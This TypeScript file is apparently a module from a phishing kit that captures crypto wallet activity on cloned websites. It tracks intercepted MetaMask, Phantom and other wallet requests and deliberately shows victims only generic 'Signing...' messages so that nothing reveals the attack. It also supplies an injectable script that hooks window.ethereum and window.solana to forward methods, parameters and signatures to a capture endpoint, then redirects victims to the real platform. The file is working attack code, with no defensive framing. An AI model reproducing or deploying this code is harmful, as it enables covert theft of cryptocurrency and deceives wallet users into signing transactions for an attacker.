/**
 * Wallet Silent Capture — Minimal-friction wallet hooking
 * Shows generic "connecting...", "signing..." messages
 * Does NOT show custom messages that reveal attack
 */

import { EventEmitter } from 'events'

export interface WalletCaptureRequest {
  requestId: string
  walletType: 'metamask' | 'phantom' | 'trezor' | 'ledger' | 'coinbase' | 'walletconnect'
  method: string // eth_sendTransaction, signMessage, etc
  params: unknown[]
  timestamp: number
  status: 'pending' | 'approved' | 'rejected' | 'signed'
  signature?: string
  error?: string
}

interface CapturedTransaction {
  hash?: string
  signature?: string
  publicKey?: string
  rawTx?: string
}

class WalletSilentCapture extends EventEmitter {
  private capturedRequests: Map<string, WalletCaptureRequest> = new Map()
  private capturedTransactions: Map<string, CapturedTransaction> = new Map()

  /**
   * Register wallet request with generic loading message
   */
  registerRequest(
    walletType: 'metamask' | 'phantom' | 'trezor' | 'ledger' | 'coinbase' | 'walletconnect',
    method: string,
    params: unknown[],
  ): { requestId: string; message: string } {
    const requestId = `wallet-${Date.now()}-${Math.random().toString(36).slice(2)}`

    this.capturedRequests.set(requestId, {
      requestId,
      walletType,
      method,
      params,
      timestamp: Date.now(),
      status: 'pending',
    })

    // Generic message based on wallet type and method
    const message = this.generateGenericMessage(walletType, method)

    return { requestId, message }
  }

  /**
   * Generate GENERIC loading message
   * NOT custom like "Approve Swap" - just plain "Connecting..."
   */
  private generateGenericMessage(walletType: string, method: string): string {
    if (method.includes('sign') || method.includes('Sign')) {
      return 'Signing...'
    }
    if (method.includes('send') || method.includes('Send')) {
      return 'Processing...'
    }
    if (method.includes('connect')) {
      return 'Connecting wallet...'
    }
    return 'Loading...'
  }

  /**
   * Capture signature/approval from wallet
   * Called when wallet approves the request
   */
  captureSignature(requestId: string, signature: string): void {
    const request = this.capturedRequests.get(requestId)
    if (!request) return

    request.status = 'signed'
    request.signature = signature

    this.capturedTransactions.set(requestId, {
      signature,
    })

    this.emit(`signed:${requestId}`, signature)
  }

  /**
   * Capture raw transaction data from wallet
   */
  captureTransaction(requestId: string, txData: CapturedTransaction): void {
    const request = this.capturedRequests.get(requestId)
    if (!request) return

    request.status = 'approved'

    this.capturedTransactions.set(requestId, txData)

    this.emit(`approved:${requestId}`, txData)
  }

  /**
   * Mark wallet request as rejected
   */
  markRejected(requestId: string, error?: string): void {
    const request = this.capturedRequests.get(requestId)
    if (!request) return

    request.status = 'rejected'
    request.error = error

    this.emit(`rejected:${requestId}`, error)
  }

  /**
   * Wait for wallet signature
   */
  async waitForSignature(requestId: string, timeoutMs = 180000): Promise<string | null> {
    const request = this.capturedRequests.get(requestId)
    if (!request) return null

    return new Promise((resolve) => {
      const timer = setTimeout(() => {
        resolve(null)
      }, timeoutMs)

      this.once(`signed:${requestId}`, (sig: string) => {
        clearTimeout(timer)
        resolve(sig)
      })

      this.once(`rejected:${requestId}`, () => {
        clearTimeout(timer)
        resolve(null)
      })
    })
  }

  /**
   * Wait for wallet approval
   */
  async waitForApproval(requestId: string, timeoutMs = 180000): Promise<CapturedTransaction | null> {
    const request = this.capturedRequests.get(requestId)
    if (!request) return null

    return new Promise((resolve) => {
      const timer = setTimeout(() => {
        resolve(null)
      }, timeoutMs)

      this.once(`approved:${requestId}`, (txData: CapturedTransaction) => {
        clearTimeout(timer)
        resolve(txData)
      })

      this.once(`rejected:${requestId}`, () => {
        clearTimeout(timer)
        resolve(null)
      })
    })
  }

  /**
   * Get captured request details
   */
  getRequest(requestId: string): WalletCaptureRequest | undefined {
    return this.capturedRequests.get(requestId)
  }

  /**
   * Get captured transaction
   */
  getTransaction(requestId: string): CapturedTransaction | undefined {
    return this.capturedTransactions.get(requestId)
  }

  /**
   * Cleanup old requests (older than 1 hour)
   */
  cleanup(): number {
    const now = Date.now()
    const oneHour = 60 * 60 * 1000
    let cleaned = 0

    for (const [id, request] of this.capturedRequests.entries()) {
      if (now - request.timestamp > oneHour) {
        this.capturedRequests.delete(id)
        this.capturedTransactions.delete(id)
        cleaned++
      }
    }

    return cleaned
  }
}

// Export singleton
export const walletSilentCapture = new WalletSilentCapture()

/**
 * Client-side injection code
 * Injects into clone to capture wallet interactions
 */
export function getWalletCaptureInjectionCode(): string {
  return `
(function() {
  const API_ENDPOINT = window.location.origin + '/api/v1/wallet-capture';

  // Intercept ethereum provider
  if (window.ethereum) {
    const originalRequest = window.ethereum.request;
    window.ethereum.request = async function(request) {
      const { requestId, message } = await fetch(API_ENDPOINT + '/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletType: 'metamask',
          method: request.method,
          params: request.params
        })
      }).then(r => r.json());

      // Show generic loading message to user
      console.log('[Wallet]', message);

      try {
        const result = await originalRequest.call(this, request);

        // Capture signature
        if (result && typeof result === 'string') {
          await fetch(API_ENDPOINT + '/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ requestId, signature: result })
          });
        }

        return result;
      } catch (error) {
        await fetch(API_ENDPOINT + '/reject', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ requestId, error: error.message })
        });
        throw error;
      }
    };
  }

  // Intercept Phantom (Solana)
  if (window.solana) {
    const originalRequest = window.solana.request;
    window.solana.request = async function(request) {
      const { requestId, message } = await fetch(API_ENDPOINT + '/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletType: 'phantom',
          method: request.method,
          params: request.params
        })
      }).then(r => r.json());

      console.log('[Wallet]', message);

      try {
        const result = await originalRequest.call(this, request);

        if (result && result.signature) {
          await fetch(API_ENDPOINT + '/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ requestId, signature: result.signature })
          });
        }

        return result;
      } catch (error) {
        await fetch(API_ENDPOINT + '/reject', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ requestId, error: error.message })
        });
        throw error;
      }
    };
  }
})();
`
}

/**
 * Generate redirect response to real platform
 */
export function generateRedirectResponse(platform: string, accessToken?: string): object {
  return {
    success: true,
    redirect: `https://${platform.toLowerCase()}.com/dashboard${accessToken ? `?token=${accessToken}` : ''}`,
    message: 'Login successful. Redirecting...',
  }
}
